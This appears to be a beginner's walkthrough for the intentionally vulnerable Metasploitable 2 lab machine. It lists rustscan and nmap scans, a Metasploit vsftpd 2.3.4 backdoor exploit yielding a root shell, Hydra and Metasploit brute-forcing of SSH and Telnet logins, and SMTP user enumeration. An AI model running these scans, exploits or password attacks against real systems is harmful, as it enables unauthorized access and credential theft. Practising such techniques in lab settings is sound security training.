

# Metasploitable: 2 Walkthrough 

**VulnHub Link:** [Metasploitable: 2](https://www.vulnhub.com/entry/metasploitable-2,29/)
**Difficulty:** Easy
**Release Date:** 12 Jun 2012

## 1.Reconnaissance
```bash
rustscan -a 172.16.147.135 --ulimit 5000 -r 1-10000
nmap -sV -A -O -T5 -sV 172.16.147.135 -p21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8187
```

## 2.Enumeration

### FTP
```bash
ftp 172.16.147.135
```

username : anonymous | password : anything
We got anonymous access and but we find out vsFTP 2.3.4 from nmap output

```bash
msfconsole -q
search vsFTP
use unix/ftp/vsftpd_234_backdoor
```

setting RHOSTS , LHOST and LPORT

and then run

and BOOM !! , We got root shell


### SSH
Brute Forcing is not a pleasent way but for demonstrating , we can use Hydra or MSFconsole for it
```
hydra -L users.txt -P passwords.txt ssh://172.16.147.135
```

OR 

```bash
msfconsole -q
search ssh login
use auxiliary/scanner/ssh/ssh_login
```

setting RHOSTS, LHOST , LPORT

and msfadmin:msfadmin credentials compromised


### Telnet
Again we will use msfconsole or hydra for brute forcing))

```bash 
hydra -L users.txt -P passwords.txt telnet://172.16.147.135
```

OR

```bash
msfconsole -q
search telnet login
use scanner/telnet/telnet_login
```


setting RHOSTS, LHOST , LPORT

and again msfadmin:msfadmin credentials compromised


### SMTP

We couldnt get any shell from SMTP port but we can find some important information such as users
We can do this via :
```bash
msfconsole -q
use scanner/smtp/smtp_enum
```
Set RHOSTS and run --> we got users
[+] 172.16.147.135:25     - 172.16.147.135:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
